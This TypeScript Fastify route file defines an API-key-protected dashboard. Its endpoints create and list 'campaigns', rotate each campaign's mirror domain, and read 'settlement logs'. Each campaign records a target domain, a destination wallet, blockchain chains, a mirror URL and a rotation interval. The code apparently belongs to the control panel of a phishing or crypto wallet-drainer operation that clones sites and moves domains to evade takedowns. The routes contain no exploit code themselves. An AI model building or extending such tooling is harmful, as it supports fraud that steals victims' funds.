/**
 * Dashboard stats API — authenticated via X-API-Key (DASHBOARD_API_KEY).
 */
import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'

import { sendFailure, sendSuccess } from '../lib/api-response.js'
import { rotateCampaignById } from '@legion/mirror'

import {
  getCampaignRecord,
  insertCampaign,
  listCampaigns,
  queryDashboardStats,
  querySettlementLogs,
} from '../lib/dashboard-queries.js'
import { parseBody, createCampaignBodySchema } from '../lib/schemas.js'

export type DashboardAuthReason =
  | 'ok'
  | 'key_not_configured'
  | 'key_missing_header'
  | 'key_mismatch'

export function authorizeDashboard(request: FastifyRequest): DashboardAuthReason {
  const expected = process.env['DASHBOARD_API_KEY']?.trim()
  if (!expected) return 'key_not_configured'

  const hdr = request.headers['x-api-key']
  const received =
    typeof hdr === 'string' ? hdr.trim() : Array.isArray(hdr) ? String(hdr[0] ?? '').trim() : ''

  if (!received) return 'key_missing_header'
  if (received !== expected) return 'key_mismatch'
  return 'ok'
}

function dashboardAuthFailure(
  reply: FastifyReply,
  auth: Exclude<DashboardAuthReason, 'ok'>,
): ReturnType<typeof sendFailure> {
  const code =
    auth === 'key_not_configured'
      ? 'DashboardKeyNotConfigured'
      : auth === 'key_missing_header'
        ? 'DashboardKeyMissing'
        : 'DashboardKeyInvalid'
  const status = auth === 'key_not_configured' ? 503 : 401
  return sendFailure(reply, status, `Dashboard API unauthorized (${auth})`, { code })
}

function dashboardPreHandler(request: FastifyRequest, reply: FastifyReply, done: () => void): void {
  const auth = authorizeDashboard(request)
  if (auth !== 'ok') {
    void dashboardAuthFailure(reply, auth)
    return
  }
  done()
}

export async function registerStatsRoute(app: FastifyInstance): Promise<void> {
  const preHandler = dashboardPreHandler

  app.get(
    '/api/v1/stats',
    { preHandler },
    async (_request: FastifyRequest, reply: FastifyReply) => {
      try {
        const stats = await queryDashboardStats()
        return sendSuccess(reply, 200, 'Dashboard stats', stats)
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e)
        if (msg.includes('DATABASE_URL')) {
          return sendFailure(reply, 503, 'Database not configured', { code: 'DatabaseNotConfigured' })
        }
        if (msg.includes('relation "campaigns" does not exist')) {
          return sendFailure(reply, 503, 'Campaigns table missing — run migration 0014_campaigns', {
            code: 'CampaignsTableMissing',
          })
        }
        return sendFailure(reply, 500, `Failed to load dashboard stats: ${msg}`, {
          code: 'StatsQueryFailed',
        })
      }
    },
  )

  app.post(
    '/api/v1/campaigns',
    { preHandler },
    async (request: FastifyRequest, reply: FastifyReply) => {
      const body = parseBody(createCampaignBodySchema, request.body)
      if (body.ok === false) {
        return sendFailure(reply, 400, body.message, { code: 'ValidationError' })
      }

      try {
        const campaign = await insertCampaign({
          name: body.data.name,
          target_domain: body.data.target_domain,
          destination_wallet: body.data.destination_wallet,
          chains: body.data.chains,
          auto_rotate: body.data.auto_rotate,
          mirror_url: body.data.mirror_url ?? null,
          rotation_interval_hours: body.data.rotation_interval_hours,
        })
        return sendSuccess(reply, 201, 'Campaign created', campaign)
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e)
        if (msg.includes('relation "campaigns" does not exist')) {
          return sendFailure(reply, 503, 'Campaigns table missing — run migration 0014_campaigns', {
            code: 'CampaignsTableMissing',
          })
        }
        return sendFailure(reply, 500, `Failed to create campaign: ${msg}`, {
          code: 'CampaignCreateFailed',
        })
      }
    },
  )

  app.get(
    '/api/v1/campaigns',
    { preHandler },
    async (_request: FastifyRequest, reply: FastifyReply) => {
      try {
        const campaigns = await listCampaigns()
        return sendSuccess(reply, 200, 'Campaigns listed', { campaigns, count: campaigns.length })
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e)
        if (msg.includes('relation "campaigns" does not exist')) {
          return sendFailure(reply, 503, 'Campaigns table missing — run migration 0014_campaigns', {
            code: 'CampaignsTableMissing',
          })
        }
        return sendFailure(reply, 500, `Failed to list campaigns: ${msg}`, {
          code: 'CampaignListFailed',
        })
      }
    },
  )

  app.post(
    '/api/v1/campaigns/:id/rotate',
    { preHandler },
    async (request: FastifyRequest, reply: FastifyReply) => {
      const id = (request.params as { id?: string }).id?.trim()
      if (!id) {
        return sendFailure(reply, 400, 'Campaign id required', { code: 'ValidationError' })
      }
      if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$|^\d+$/.test(id)) {
        return sendFailure(reply, 400, 'Campaign id must be a valid UUID or numeric ID', { code: 'ValidationError' })
      }

      try {
        const existing = await getCampaignRecord(id)
        if (!existing) {
          return sendFailure(reply, 404, 'Campaign not found', { code: 'NotFound' })
        }
        const result = await rotateCampaignById(id, 'manual_api')
        if (result.ok === false) {
          return sendFailure(reply, 502, result.detail, { code: 'MirrorRotationFailed' })
        }
        const updated = await getCampaignRecord(id)
        return sendSuccess(reply, 200, 'Mirror domain rotated', {
          rotation: result,
          campaign: updated,
        })
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e)
        return sendFailure(reply, 500, `Failed to rotate campaign mirror: ${msg}`, {
          code: 'MirrorRotationError',
        })
      }
    },
  )

  app.get(
    '/api/v1/logs',
    { preHandler },
    async (_request: FastifyRequest, reply: FastifyReply) => {
      try {
        const logs = await querySettlementLogs(100)
        return sendSuccess(reply, 200, 'Settlement logs', { logs, count: logs.length })
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e)
        return sendFailure(reply, 500, `Failed to load settlement logs: ${msg}`, {
          code: 'LogsQueryFailed',
        })
      }
    },
  )
}
